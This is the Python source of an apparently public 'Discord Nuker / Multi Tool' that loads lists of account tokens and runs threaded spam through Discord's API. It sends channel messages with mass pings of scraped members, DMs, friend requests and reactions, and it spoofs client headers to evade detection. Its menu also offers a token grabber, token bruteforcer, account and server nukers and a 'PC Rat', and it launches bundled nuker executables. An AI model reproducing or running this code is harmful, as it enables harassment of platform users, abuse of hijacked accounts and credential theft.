# Made by ††#7777 | https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
# You need to have tokens.txt at same folder, at tokens.txt put your own tokens. For token bruteforcer you need to create .txt file named grab.txt
# You need to write to cmd: pip install discord, pip install pyautoui, pip install requests, pip install websocket, pip install emoji, pip install json, pip intall base64, pip install colorama. Without it, the code will not work.
# GANG Discord Nuker / Multi Tool©


# Copyright © 2022 ††#7777
# Copyright © GANG Discord Nuker / Multi Tool

# Permission is hereby granted, free of charge, to any person
# obtaining a copy of this software and associated documentation
# files (the "Software"), to deal in the Software without
# restriction, including without limitation the rights to use,
# copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software. and tt runz you permit persons to whom the
# Software is furnished to do so, subject to the following
# conditions:

# The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
# OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
# OTHER DEALINGS IN THE SOFTWARE.

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r[\x1b[95m+\x1b[95m\x1B[37m] Loading HWID... [{i}]""")
		sys.stdout.flush()
		time.sleep(0.1)

from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title Loading GANG Nuker...")
print(f"{Fore.WHITE}")
progressbar = tqdm([2,4,6,8,9,10])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Loading: ')
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title Scaping Proxies...")
print(f"{Fore.LIGHTMAGENTA_EX}")
progressbar = tqdm([2,4,6,8,9,10,11,12,13,14,15])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Scaping Proxies... ')
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title Loading HUD...")
print(f"{Fore.WHITE}")
progressbar = tqdm([1,2,3])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Loading HUD... ')
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title Checking For Updates...")
print(f"{Fore.LIGHTMAGENTA_EX}")
progressbar = tqdm([1,2,])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Checking For Updates... ')

import base64, pyperclip

import os
from os import system

try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from requests import get
except:
    os.system("pip install requests")
    from requests import get

import threading

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    import discord
except:
    os.system("pip install discord")
    import discord

from discord.ext import commands

try:
    import pyautogui
except:
    os.system("pip install pyautogui")
    import pyautogui

import time
import re

try:
    import http.client
except:
    os.system('pip install python-http-client')
    import http.client

import random

try:
    import json
except:
    os.system('pip install json')
    import json


try:
    import base64
except:
    os.system('pip install base64')
    import base64

import string
import sys
from colorama import Fore

try:
    import emoji as ej
except:
    os.system('pip install emoji')
    import emoji as ej

try:
    import websocket
except:
    os.system('pip install websocket')
    import websocket

try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio

try:
    from bs4 import BeautifulSoup
except:
    os.system('pip install beautifulsoup4')

try:
    from webdriver_manager.chrome import ChromeDriverManager
except:
    os.system('pip install webdriver-manager')
    from webdriver_manager.chrome import ChromeDriverManager

try:
    from PIL import Image
except:
    os.system('pip install pillow')
    from PIL import Image

try:
    import discum
except:
    os.system('pip install discum')
    import discum

try:
    from selenium import webdriver
except:
    os.system('pip install selenium')
    from selenium import webdriver

ur = 'https://discord.com/api/v9/channels/messages'
title = '        ・          GANG Nuker          ・          Made by ††#7777'
system(f'title {title}')
tokens = open('tokens.txt', 'r').read().splitlines()


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]

    return text


def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }


def secondHeader(token):
    return {
        ':authority': 'discord.com',
        ':method': 'PATCH',
        ':path': '/api/v9/users/@me',
        ':scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'authorization': token,
        'content-length': '124',
        'content-type': 'application/json',
        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        'origin': 'https://canary.discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}

def spammer():
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    counttokens = len(open('tokens.txt').readlines())
    clear = lambda: os.system('cls')
    clear()

    colorama.init()
    print('')
    print('')
    print(f'                                       {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$$$$$${Fore.RESET}   {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$$$$$${Fore.RESET}  {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$${Fore.RESET}   {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$${Fore.RESET}  {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$$$$$${Fore.RESET}')
    print(f'                                      {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}__{Fore.RESET}  {Fore.LIGHTMAGENTA_EX}$${Fore.RESET} {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}__{Fore.RESET}  {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$$${Fore.RESET} {Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET} {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}__{Fore.RESET}  {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}')
    print(f'                                     {Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}  {Fore.WHITE}\__/|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}  {Fore.WHITE}\{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}| {Fore.LIGHTMAGENTA_EX}$$$${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}  {Fore.WHITE}\__/')
    print(f'                                     {Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET} {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$$$${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$$$$$$$${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$$ $$ $${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET} {Fore.WHITE}/{Fore.RESET}{Fore.LIGHTMAGENTA_EX}$$$$')
    print(f'                                     {Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}|_{Fore.RESET}  {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}__{Fore.RESET}  {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$$  $$$${Fore.RESET}{Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}{Fore.WHITE}|_{Fore.RESET}  {Fore.LIGHTMAGENTA_EX}$$')
    print(f'                                     {Fore.WHITE}|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}  {Fore.WHITE}\{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}| {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}  | {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}| {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}\  {Fore.LIGHTMAGENTA_EX}$$${Fore.RESET}| {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}  \ {Fore.LIGHTMAGENTA_EX}$$')
    print(f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}>{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.LIGHTMAGENTA_EX}M{Fore.RESET}a{Fore.LIGHTMAGENTA_EX}d{Fore.RESET}e {Fore.LIGHTMAGENTA_EX}b{Fore.RESET}y ††#7777{Fore.RESET}                  {Fore.WHITE}|{Fore.RESET}  {Fore.LIGHTMAGENTA_EX}$$$$$${Fore.RESET}{Fore.WHITE}/|{Fore.RESET} {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}  | {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}| {Fore.LIGHTMAGENTA_EX}$${Fore.RESET} \  {Fore.LIGHTMAGENTA_EX}$${Fore.RESET}|  {Fore.LIGHTMAGENTA_EX}$$$$$${Fore.RESET}/')
    print(f'{Fore.WHITE}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}>{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.LIGHTMAGENTA_EX}h{Fore.RESET}t{Fore.LIGHTMAGENTA_EX}t{Fore.RESET}p{Fore.LIGHTMAGENTA_EX}s{Fore.RESET}:{Fore.LIGHTMAGENTA_EX}/{Fore.RESET}/{Fore.LIGHTMAGENTA_EX}g{Fore.RESET}i{Fore.LIGHTMAGENTA_EX}t{Fore.RESET}h{Fore.LIGHTMAGENTA_EX}u{Fore.RESET}b{Fore.LIGHTMAGENTA_EX}.{Fore.RESET}c{Fore.LIGHTMAGENTA_EX}o{Fore.RESET}m{Fore.LIGHTMAGENTA_EX}/{Fore.RESET}T{Fore.LIGHTMAGENTA_EX}T{Fore.RESET}-{Fore.LIGHTMAGENTA_EX}T{Fore.RESET}u{Fore.LIGHTMAGENTA_EX}t{Fore.RESET}o{Fore.LIGHTMAGENTA_EX}r{Fore.RESET}i{Fore.LIGHTMAGENTA_EX}a{Fore.RESET}l{Fore.LIGHTMAGENTA_EX}s{Fore.RESET}{Fore.WHITE}   \______/ |__/  |__/|__/  \__/ \______/')
    print(f'{Fore.WHITE}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}>{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.LIGHTRED_EX}{counttokens}{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}1{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Joiner          {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}9{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Spammer           {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}17{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} MassReport{Fore.RESET}          {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}25{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Generator{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}2{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Leaver          {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}10{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} DM Spammer        {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}18{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} About/Activity{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}26{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Nitro Generator{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}3{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Checker   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}11{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Friend Spammer    {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}19{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Typing Spammer{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}27{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Advanced Token Grabber{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}4{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Onliner   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}12{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} HypeSquad Joiner  {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}20{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Bruteforcer{Fore.RESET}   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}28{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} PC Rat{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}5{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Grabber   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}13{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Reaction Spam     {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}21{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Status Changer{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}29{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Tools{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}6{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Server MassDM   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}14{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} NickName Changer  {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}22{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Group Spammer{Fore.RESET}       {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}30{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}{Fore.LIGHTRED_EX} Exit{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}7{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Account Nuker   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}15{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Webhook Spammer   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}23{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Auto Login {Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}8{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Server Nuker    {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}16{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} VC Spammer        {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}24{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} About {Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}')
    choice = input('\x1B[1m[-->]\x1B[1m ')

    if choice == '9':
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f"""{Fore.LIGHTRED_EX}[!]{Fore.RESET} Make Sure Your Tokens Are In Token.txt For Spammer To Work!\n""")
        tokens = open("tokens.txt", "r").read().splitlines()
        server = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
        channel = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')
        mess = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Message: ')
        delay = float(input(f'[\x1b[95m>\x1b[95m\x1B[37m] Delay: '))
        ch = input('[\x1b[95m>\x1b[95m\x1B[37m] Do you want random string: y/n?: ').lower()
        mas = input('[\x1b[95m>\x1b[95m\x1B[37m] Skip Invaild Tokens: y/n?: ').lower()

        if mas == 'n':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/users.txt', "w")
            for element in memberslist:
                f.write(f'<@{element}>' + '\n')
            f.close()

        def spam(token, mess):
            if mas == 'n':
                with open("utilities/QR/users.txt", "r") as file:
                    allText = file.read()
                    words = list(map(str, allText.split()))
                    mess += ''.join(random.choice(words))

            if ch == 'n':
                mess += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))

            elif ch == 'n':
                pass

            else:
                pass

            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            payload = {"content": mess, "tts": False}
            header = mainHeader(token)

            while True:
                time.sleep(delay)
                src = requests.post(url, headers=header, json=payload)

                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for",
                          str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif src.status_code == 200:
                    print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {mess} Sent')

                elif src.status_code == 401:
                    print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Invalid Token')
                elif src.status_code == 404:
                    print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Not Found...')
                elif src.status_code == 403:
                    print(f'{Fore.LIGHTRED_EX}[!]{Fore.RESET} Token Doesnt Have Perms For This Channel...')

        def thread():
            text = mess
            for token in tokens:
                threading.Thread(target=spam, args=(token, text)).start()

        start = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter To Start: ')
        start = thread()

        time.sleep(5)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        clear()
        exit = spammer()

    if choice == '10':
        os.system('cls')
        Spinner()
        os.system('cls')
        def DMSpammer(idd, message, token):
            header = mainHeader(token)

            payload = {'recipient_id': idd}
            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header,
                               json=payload)
            if chrr == 'y':
                message += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
            elif chrr == 'n':
                pass
            else:
                pass

            payload = {"content": message, "tts": False}
            j = json.loads(r1.content)

            while True:
                r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                   headers=header, json=payload)

                if r2.status_code == 429:
                    ratelimit = json.loads(r2.content)
                    print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Ratelimit for",
                          str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif r2.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} DM Sent to: {idd}!")

        tokens = open("tokens.txt", "r").read().splitlines()
        print(f"{Fore.RED}[!]{Fore.RESET} Make Sure You Have Put Tokens In 'token.txt' Before Using DM Spammer!")
        user = input(f"[\x1b[95m>\x1b[95m\x1B[37m] User ID: ")
        message = input(f"[\x1b[95m>\x1b[95m\x1B[37m] Message: ")
        delay = int(input('[\x1b[95m?\x1b[95m\x1B[37m] Delay: '))
        chrr = input('[\x1b[95m>\x1b[95m\x1B[37m] Do you want append random string: y/n?: ').lower()


        def thread():
            for token in tokens:
                time.sleep(delay)
                threading.Thread(target=DMSpammer, args=(user, message, token)).start()

        start = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        start = thread()

        time.sleep(2)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '11':
        os.system('cls')
        Spinner()
        os.system('cls')
        def friender(token, user):
            try:
                user = user.split("#")
                headers = mainHeader(token)
                payload = {"username": user[0], "discriminator": user[1]}
                src = requests.post('https://discord.com/api/v9/users/@me/relationships', headers=headers,
                                    json=payload)
                if src.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Friend Request Sent to {user[0]}#{user[1]}! ")
            except Exception as e:
                print(e)

        user = input(f"\n[\x1b[95m>\x1b[95m\x1B[37m] Username + Tag: ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input(f'Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()

        time.sleep(2)
        exit = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    if choice == '13':
        os.system('cls')
        Spinner()
        os.system('cls')
        def reaction(chd, iddd, org, token):
            headers = {'Content-Type': 'application/json',
                       'Accept': '*/*',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'en-US',
                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                       'DNT': '1',
                       'origin': 'https://discord.com',
                       "sec-fetch-dest": "empty",
                       "sec-fetch-mode": "cors",
                       "sec-fetch-site": "same-origin",
                       'TE': 'Trailers',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                       'authorization': token,
                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                       }

            emoji = ej.emojize(org, use_aliases=True)
            a = requests.put(
                f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                headers=headers)
            if a.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Reaction {org}")
            else:
                print(f"{Fore.LIGHTRED_EX}[!]{Fore.RESET} Error")

        tokens = open('tokens.txt', 'r').read().splitlines()
        chd = input('[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')
        iddd = input('[\x1b[95m>\x1b[95m\x1B[37m] Message ID: ')
        emoji = input('[\x1b[95m>\x1b[95m\x1B[37m] Emoji: ')
        delay = int(input('[\x1b[95m>\x1b[95m\x1B[37m] Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()

        time.sleep(1)
        exit = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press Enter: ')
        exit = clear()
        exit = spammer()

    elif choice == "29":
        os.system('cls')
        Spinner()
        os.system('cls')
        print(f'''
{Fore.LIGHTMAGENTA_EX}#Random:{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}1{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Webhook Spammer
{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}2{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Info
{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}3{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} DMALL

{Fore.LIGHTMAGENTA_EX}#Nukers:{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}4{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Rage
{Fore.LIGHTMAGENTA_EX}[{Fore.RESET}{Fore.WHITE}5{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Skidded
''')
        tool = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")
        if tool == "---":
            token = input("[\x1b[95m>\x1b[95m\x1B[37m] Token: ")
            with open('---', 'w') as f:
                f.write('''{
    "token": "%s",
    "password": "",
    "prefix": ">",
    "nitro_sniper": false
}
''' % (token))
            time.sleep(1)
            call(["python", "-"])
        elif tool == "999":
            token = input("[\x1b[95m>\x1b[95m\x1B[37m] Token: ")
            with open('---', 'w') as f:
                f.write('''{
  "token": "%s",
  "prefix": "!",
  "deletetimer": 40,
  "errorlog": "Error!"
}	
''' % (token))
            time.sleep(1)
        elif tool == "1":
            os.startfile(os.getcwd() + '/utilities/other/ws/webhookspammer.exe')
        elif tool == "5":
            os.startfile(os.getcwd() + '/utilities/other/skidded/accnuker.exe')
        elif tool == "4":
            os.startfile(os.getcwd() + '/utilities/other/rage/start.bat')
        elif tool == "3":
            os.startfile(os.getcwd() + '/utilities/other/dmall/DmAll.exe')
        elif tool == "2":
